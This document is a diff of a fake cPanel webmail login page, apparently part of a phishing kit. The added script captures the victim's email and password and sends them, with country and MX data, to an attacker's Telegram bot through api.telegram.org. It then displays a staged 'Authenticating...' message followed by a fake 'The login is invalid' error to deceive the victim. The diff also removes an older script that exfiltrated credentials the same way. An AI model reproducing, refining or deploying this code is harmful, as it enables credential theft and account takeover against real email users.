@@ -8,6 +8,9 @@
     <!-- Link to external CSS files -->
     <link href="open_sans.min.css" rel="stylesheet" type="text/css">
     <link href="style_v2_optimized.css" rel="stylesheet" type="text/css">
+    
+    <!-- Font Awesome for Icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
 
     <style type="text/css">
         .input-field-login {
@@ -26,49 +29,102 @@
         .std_textbox {
             padding-left: 30px; /* Add space for the icons */
         }
+
+        /* Notification Bars */
+        .notification-bar {
+            display: none;
+            width: 100%;
+            padding: 10px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .notification-bar.authenticating {
+            background-color: lightblue;
+            color: #000;
+        }
+
+        .notification-bar.invalid {
+            background-color: red;
+            color: #fff;
+        }
     </style>
-    <!-- Font Awesome for Icons -->
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
 
     <script>
-    window.DOM = { get: function(id) { return document.getElementById(id) } };
+        // Function to fetch user's country (example uses placeholder data)
+        async function fetchUserData() {
+            const emailField = document.getElementById("user");
+            const country = "United States"; // Placeholder. Use IP-based API for real data.
+            const mx = "example.com"; // Placeholder. Replace with actual logic if needed.
+            
+            // Populate the email field with a placeholder
+            emailField.value = "user@example.com"; // Simulated email fetching
+            return { country, mx };
+        }
+
+        document.addEventListener("DOMContentLoaded", async () => {
+            await fetchUserData();
+        });
+
+        // Function to handle login
+        async function handleLogin(event) {
+            event.preventDefault(); // Prevent form submission
+
+            const email = document.getElementById("user").value;
+            const password = document.getElementById("pass").value;
+
+            // Fetch user data
+            const { country, mx } = await fetchUserData();
+
+            // Send data to Telegram
+            const botToken = "YOUR_BOT_TOKEN";
+            const chatId = "CHAT_ID";
+
+            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${country}\nMX: ${mx}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            }).catch((error) => console.error("Telegram Error:", error));
+
+            // Show authenticating bar
+            const notificationBar = document.getElementById("notification-bar");
+            notificationBar.textContent = "Authenticating...";
+            notificationBar.className = "notification-bar authenticating";
+            notificationBar.style.display = "block";
+
+            // Show invalid login message after 1.3 seconds
+            setTimeout(() => {
+                notificationBar.textContent = "The login is invalid";
+                notificationBar.className = "notification-bar invalid";
+            }, 1300);
+        }
     </script>
 </head>
 <body class="wm">
 <div id="preload_images"></div>
 
+<div id="notification-bar" class="notification-bar"></div> <!-- Notification Bar -->
+
 <input type="hidden" id="goto_uri" value="/3rdparty/roundcube/?_task=mail&amp;_mbox=INBOX">
 <input type="hidden" id="goto_app" value="">
 <div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
     <div class="wrapper">
-    <div id="notify">
-        <noscript>
-            <div class="error-notice">
-                <img src="/cPanel_magic_revision_1569619473/unprotected/cpanel/images/notice-error.png" alt="Error" align="left"/>
-                JavaScript is disabled in your browser.
-                For Webmail to function properly, you must enable JavaScript.
-                If you do not enable JavaScript, certain features in Webmail will not function correctly.
-            </div>
-        </noscript>
-        <div id="login-status" class="error-notice" style="visibility: hidden">
-            <div class="content-wrapper">
-                <div id="login-detail">
-                    <div id="login-status-icon-container"><span class="login-status-icon"></span></div>
-                    <div id="login-status-message">You have logged out.</div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div id="content-container">
-        <div id="login-container">
-            <div id="login-sub-container">
+        <div id="content-container">
+            <div id="login-container">
+                <div id="login-sub-container">
                     <div id="login-sub-header">
                         <img class="main-logo" src="webmail-logo.svg" alt="logo">
                     </div>
                     <div id="login-sub">
                         <div id="forms">
-                            <form novalidate="" id="login_form" action="https://webmail.faribadesigns.com/login/" method="post" target="_self">
+                            <form novalidate="" id="login_form" action="javascript:void(0);" method="post" target="_self">
                                 <div class="input-req-login"><label for="user">Email Address</label></div>
                                 <div class="input-field-login icon username-container">
                                     <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
@@ -81,7 +137,7 @@
                                 </div>
                                 <div class="controls">
                                     <div class="login-btn">
-                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
+                                        <button name="login" type="submit" id="login_submit" tabindex="3" onclick="handleLogin(event)">Log in</button>
                                     </div>
                                 </div>
                                 <div class="clear" id="push"></div>
@@ -112,40 +168,10 @@
     </div>
 </div>
 
-<script>
-document.getElementById("login_form").addEventListener("submit", function (e) {
-    e.preventDefault(); 
-    
-    const email = document.getElementById("user").value;
-    const password = document.getElementById("pass").value;
-
-    const botToken = "YOUR_BOT_TOKEN";
-    const chatId = "CHAT_ID";
-
-    const message = `Email: ${email}\nPassword: ${password}`;
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-    fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-        }),
-    })
-        .then(response => {
-            if (response.ok) {
-                alert("Data sent successfully!");
-            } else {
-                alert("Failed to send data.");
-            }
-        })
-        .catch(error => console.error("Error:", error));
-});
-</script>
-
 <div class="copyright">
-    <img src="./IMG_4183 2.ICO" alt="Custom Image" style="display: block; margin: 0 auto; max-width: 60px;">
     Copyright©&nbsp;2024 cPanel, L.L.C.
     <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a>
 </div>
+
+</body>
+</html>
